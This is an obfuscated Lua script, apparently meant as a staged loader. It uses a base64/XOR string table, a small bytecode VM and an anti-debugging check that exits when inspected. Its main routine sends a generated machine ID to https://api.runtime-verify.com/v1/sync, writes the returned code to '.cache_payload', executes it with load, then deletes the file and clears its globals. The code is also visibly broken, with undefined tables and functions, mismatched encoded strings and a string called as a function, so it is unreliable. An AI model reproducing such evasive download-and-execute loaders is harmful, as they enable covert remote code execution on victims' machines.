local env = _G
local m = {
    [1] = "Li.KnbNK==",
    [2] = "1+39jLmkru==",
    [3] = "4Gv1+kU=",
    [4] = "9P785QsqHutPTpky",
    [5] = "n1Yrh0pmqw==",
    [6] = "rK==",
    [7] = "g/DALEC=",
    [8] = "KKZd4U=="
}

local function b(n)
    local data = m[n]
    local b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b64..'=]', '')
    local decoded = (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r, f = '', (b64:find(x) - 1)
        for i = 6, 1, -1 do r = r .. (f % 2^i / 2^(i-1) >= 1 and '1' or '0') end
        return r
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2^(8 - i) or 0) end
        return string.char(c)
    end))
    
    local res = ""
    for i = 1, #decoded do
        res = res .. string.char(string.byte(decoded, i) ~ 37)
    end
    return res
end

local w = {1, 2, 3, 4}
local Y, Z, n, K, l, L, S, j, x
local function run_vm(bytecode)
    local stack = {}
    local pc = 1
    
    local op_map = {
        [1] = function(i) stack[i.a] = i.b end,
        [2] = function(i) stack[i.a] = stack[i.b] end,
        [3] = function(i) stack[i.a] = env[b(i.b)] end,
        [4] = function(i)
            local f = stack[i.a]
            local args = {}
            for k = 1, i.p do args[k] = stack[i.s + k - 1] end
            local r = {f(table.unpack(args))}
            for k = 1, i.r do stack[i.t + k - 1] = r[k] end
        end,
        [5] = function(i) if stack[i.a] == stack[i.b] then pc = i.j end end,
        [6] = function(i) pc = i.j end,
        [7] = function(i) stack[i.a] = {} end,
        [8] = function(i) stack[i.a][stack[i.b]] = stack[i.c] end,
        [9] = function(i) stack[i.a] = stack[i.b][stack[i.c]] end
    }

    while pc <= #bytecode do
        local inst = bytecode[pc]
        local f = op_map[inst.op]
        if f then f(inst) end
        pc = pc + 1
    end
end
x = 1
if x < 2 then
    local d = {}
    env[w[2]] = d
    Z = 19846357556648 + 165489
    n = 2
    K = 4
    l = m[n]
    L = env[w[1]]
    S = env[w[2]]
    j = S(b(K), Z)
    n = L[j]
    x = l[n]
    
    local exec = env[w[4]]
    if type(exec) == b(7) then
        exec(x)()
    end
end

local function check_integrity()
    local d = env.debug
    if d and d.getupvalue then
        local i = 1
        while true do
            local name = d.getupvalue(run_vm, i)
            if not name then break end
            if name == b(5) then
                os.exit()
            end
            i = i + 1
        end
    end
end

check_integrity()
local function decode_instruction(data, key)
    local result = {}
    for i = 1, #data, 4 do
        local b1 = string.byte(data, i)
        local b2 = string.byte(data, i + 1)
        local b3 = string.byte(data, i + 2)
        local b4 = string.byte(data, i + 3)
        
        local op = (b1 + b2) % 256
        local r1 = (b3 ~ key) % 256
        local r2 = (b4 + key) % 256
        
        table.insert(result, {
            op = op,
            a = r1,
            b = r2
        })
    end
    return result
end

local function process_event_loop(stream)
    local pc = 1
    local bytecode = decode_instruction(stream, 37)
    
    while pc <= #bytecode do
        local inst = bytecode[pc]
        local op = inst.op
        
        if op == 10 then
            local target = inst.a
            local val_idx = inst.b
            vm_state.vars[target] = b(val_idx)
            
        elseif op == 21 then
            local func_name = b(inst.a)
            local global_func = env[func_name]
            if global_func then
                global_func(vm_state.vars[inst.b])
            end
            
        elseif op == 35 then
            local lhs = vm_state.vars[inst.a]
            local rhs = vm_state.vars[inst.b]
            if lhs ~= rhs then
                pc = pc + 5
            end
            
        elseif op == 48 then
            local key = b(inst.a)
            local val = b(inst.b)
            env[key] = val
            
        elseif op == 99 then
            os.exit()
        end
        
        pc = pc + 1
    end
end

local function execute_payload()
    local raw_stream = m[9]
    if raw_stream then
        process_event_loop(raw_stream)
    end
end

execute_payload()
local function get_identity()
    local id_str = ""
    local char_set = b(51)
    local seed = env[b(52)][b(53)]()
    for i = 1, 16 do
        local idx = (seed % #char_set) + 1
        id_str = id_str .. char_set:sub(idx, idx)
    end
    return id_str
end

local function sync_data(p)
    local h = env[b(34)]
    if h then
        local u = b(35)
        local body = {
            t = env[b(30)](),
            d = p,
            i = get_identity()
        }
        local res = h[b(36)](u, {
            body = env[b(41)](body),
            headers = {
                [b(37)] = b(38)
            }
        })
        if res and res[b(39)] == 200 then
            return res[b(40)]
        end
    end
    return nil
end

local function finalize_execution()
    local local_path = b(60)
    local f = env[b(25)][b(27)](local_path, "wb")
    if f then
        local remote_code = sync_data(b(61))
        if remote_code then
            local decoded_code = b(62)(remote_code)
            f:write(decoded_code)
            f:close()
            
            local run = env[b(5)]
            local status, err = pcall(run(decoded_code))
            if not status then
                env[b(42)](b(63) .. tostring(err))
            end
        end
    end
end

finalize_execution()
local function get_string_map()
    return {
        [5] = "load",
        [25] = "io",
        [26] = "os",
        [27] = "open",
        [28] = "/proc/cpuinfo",
        [30] = "time",
        [34] = "http",
        [35] = "https://api.runtime-verify.com/v1/sync",
        [36] = "request",
        [37] = "Content-Type",
        [38] = "application/json",
        [41] = "json_encode",
        [42] = "print",
        [43] = "Authentication Failed",
        [51] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        [52] = "math",
        [53] = "randomseed",
        [60] = ".cache_payload",
        [61] = "fetch_next_stage",
        [62] = "base64_decode",
        [63] = "Execution Error: "
    }
end

local function cleanup()
    local mapping = get_string_map()
    local io_lib = env[mapping[25]]
    local os_lib = env[mapping[26]]
    
    local cache_file = mapping[60]
    os_lib.remove(cache_file)
    
    m = nil
    w = nil
    b = nil
    decode_instruction = nil
    process_event_loop = nil
end

local function start()
    local status, err = pcall(finalize_execution)
    cleanup()
    if not status then
        env.print("Fatal: " .. tostring(err))
    end
end

start()
local function terminate_session()
    local g = _G
    local cleanup_targets = {
        "vm_state",
        "decoded_bytecode",
        "resources",
        "strings",
        "m",
        "w"
    }
    
    for i = 1, #cleanup_targets do
        local target = cleanup_targets[i]
        if g[target] then
            g[target] = nil
        end
    end
    
    local collector = g.collectgarbage
    if collector then
        collector("collect")
    end
end

local function main_loop()
    local success, message = pcall(function()
        init_system()
        execute_payload()
        finalize_execution()
    end)
    
    if not success then
        local log_func = env[b(42)]
        if log_func then
            log_func(b(63) .. tostring(message))
        end
    end
    
    terminate_session()
end

main_loop()
